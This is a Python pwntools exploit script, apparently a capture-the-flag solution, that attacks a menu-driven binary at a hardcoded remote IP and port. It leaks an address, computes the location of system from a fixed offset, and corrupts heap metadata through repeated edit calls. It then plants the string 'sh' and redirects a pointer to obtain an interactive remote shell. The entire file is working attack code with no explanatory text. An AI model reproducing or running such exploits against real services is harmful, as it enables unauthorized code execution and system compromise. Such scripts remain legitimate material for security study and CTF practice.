#!/usr/bin/python3
# -*- coding:utf-8 -*-

from pwn import *
import os, struct, random, time, sys, signal

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './a.out'
# sh = process(execve_file)
sh = remote('117.51.143.25', 5005)
elf = ELF(execve_file)
# libc = ELF('./libc-2.31.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    def pr
        x/16gx 0x605380
        end
    '''

    # f = open('/tmp/gdb_pid', 'w')
    # f.write(str(proc.pidof(sh)[0]))
    # f.close()

    f = open('/tmp/gdb_script', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def add(num):
    sh.sendlineafter('>>', '1')
    sh.sendlineafter('Input your num:', str(num))

def show_on():
    sh.sendlineafter('>>', '2')
def show_off():
    sh.sendlineafter('Edit (y/n):', 'n')

def edit(num):
    sh.sendlineafter('Edit (y/n):', 'y')
    sh.sendline(str(num))

def delete():
    sh.sendlineafter('>>', '3')

def go(num):
    for i in range(num):
        show_off()

for _ in range(0x10):
    add(0)

show_on()
show_off()
sh.recvuntil('2:')
addr = int(sh.recvline())
print('addr: ' + hex(addr))
# show_off()
edit(0x605388)
go(14)
edit(0)
edit(0x81)
go(14)
edit(0x21)
edit(0x21)

delete()

for _ in range(0x8):
    add(0)

show_on()
system_addr = addr - 0x37f7d8
edit(system_addr)
edit(system_addr)
edit(system_addr)
edit(system_addr)
edit(system_addr)
edit(system_addr)
edit(system_addr)
edit(system_addr)
edit(system_addr)
edit(system_addr)
edit(system_addr)
edit(system_addr)
go(329)

edit(u64(b'sh' + b'\0' * 6))

go(26)
pause()
edit(addr)

sh.interactive()

os.remove('/tmp/gdb_pid')
os.remove('/tmp/gdb_script')